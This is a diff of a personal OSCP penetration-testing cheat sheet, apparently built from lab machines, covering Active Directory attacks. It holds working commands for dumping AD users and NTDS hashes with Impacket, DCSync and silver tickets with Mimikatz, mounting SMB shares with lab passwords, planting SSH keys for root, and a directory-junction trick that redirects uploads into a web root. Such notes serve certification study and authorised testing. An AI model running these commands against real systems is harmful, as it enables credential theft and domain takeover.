@@ -1380,7 +1380,7 @@ rdesktop 192.168.216.165
 
 
 ### Impacket
-Get AD Users
+**Get AD Users**
 ```bash
 impacket-GetADUsers -all -dc-ip 192.168.243.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
 ```
@@ -1402,6 +1402,11 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 **secretsdump**
 ```bash
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+**Grab sid**
+```bash
+lookupsid.py dom.htb/nuri.jeon:password@192.168.x.x
 ```
 
 **constrained delegation**
@@ -1668,11 +1673,11 @@ lsadump::lsa
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
 ```
 
-### Silver Tickets
+### Silver Tickets(https://systemweakness.com/vulnlab-breach-7db2bb800e88)
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/d19bd307-1d00-478a-925c-370b483dce13)
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/472ec5a4-4224-4b09-b2c4-6662e97865d9)
 ```bash
-#Get domain SID
+# Get domain SID
 whoami /user
 #IIS service ntlm from mimikatz or somewhere
 #mimikatz silver ticket attack
@@ -1909,6 +1914,13 @@ prompt OFF
 cd 'path\to\remote\dir'
 lcd '~/path/to/download/to/'
 mget *
+
+
+# When the file is too big, just mount the share on kali's file system
+mkdir /mnt/resourced
+mount -t cifs '//192.168.179.175/Password Audit' /mnt/resourced -o 'user=V.Ventz,password=HotelCalifornia194!'
+umount /mnt/resourced
+findmnt -s
 ```
 
 
@@ -2332,6 +2344,12 @@ cat fileup.pub > authorized_keys
 rm ~/.ssh/known_hosts
 ssh -p 2222 -i fileup root@mountaindesserts.com
 
+```
+
+### junction exploit(https://seriotonctf.github.io/2023/10/19/Media-Vulnlab/index.html)
+```bash
+# If uploaded files are saved towards somewhere that we're aware of, we should remove the directory first and create a junction!
+mklink /J C:\Windows\Tasks\Uploads\3b060c7f54f15b7268440128b7f34e6e C:\xampp\htdocs
 ```
 
 ## Command Injection
